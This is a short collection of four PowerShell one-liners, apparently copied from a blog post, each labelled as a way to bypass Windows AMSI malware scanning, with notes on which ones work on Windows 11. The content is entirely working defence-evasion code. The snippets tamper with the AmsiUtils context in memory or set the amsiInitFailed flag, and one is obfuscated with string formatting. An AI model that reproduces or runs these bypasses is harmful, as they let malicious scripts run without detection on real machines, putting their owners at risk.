
[https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6]

1. **Note: Doesn't work on windows 11**
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```


2. **Works on windows 11**
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```

3. 
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Failed”) {$f=$e}};$f.SetValue($null,$true)
```
]
4. 
```powershell
$w ='System.Management.Automation.A';$c='si';$m='Utils';$assembly=[Ref].Assembly.GetType(('{0}m{1}{2}'-f $w , $c , $m ));$field=$assembly.GetField(('am{0}InitFailed'-f$c),'NonPublic,Static');$field.SetValue($null,$true)
```






